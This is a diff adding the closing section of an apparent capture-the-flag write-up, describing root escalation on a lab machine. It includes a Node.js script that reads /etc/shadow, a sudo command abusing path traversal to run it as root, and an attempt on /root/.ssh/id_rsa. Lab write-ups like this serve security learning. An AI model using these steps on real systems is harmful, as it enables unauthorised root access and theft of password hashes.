@@ -203,13 +203,50 @@ Running the command ```sudo -l```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cd11d7a4-daeb-4af3-9276-c612ef81f5e7)
 
+Node executable can be ran by user angoose to escalate privileges
+
+Lets create a javascript script that can help us read root files
+
+We can use this javascript script to read the ```/etc/shadow``` file
+
+```javascript
+const fs = require('fs');
+
+// Specify the file path
+const filePath = '/etc/shadow';
+
+// Read the file
+fs.readFile(filePath, 'utf8', (err, data) => {
+  if (err) {
+    console.error('Error reading the file:', err);
+  } else {
+    console.log('File content:');
+    console.log(data);
+  }
+});
+```
+save this in a file say "bankai.js"
+
+command:```sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/bankai.js```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d5ef4dd-412e-4a63-b1ce-b4fed26eae79)
+
+The root hash is not crackable omor. I tried reading the private key ```/root/.ssh/id_rsa```, but it wasn't available on the server.
+
+Lets just read the root flag, edit the ```bankai.js``` file, instead of ```/etc/shadow``` replace it with ```/root/root.txt```
+
+command:```sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/bankai.js```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/012fb72a-7ac5-446a-baf6-3893b3f48bba)
+
+cool stuff, we were able to read the "root.txt" file
+
+We have successfully pwned this box😎
 
 
-
-
-
-
-
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
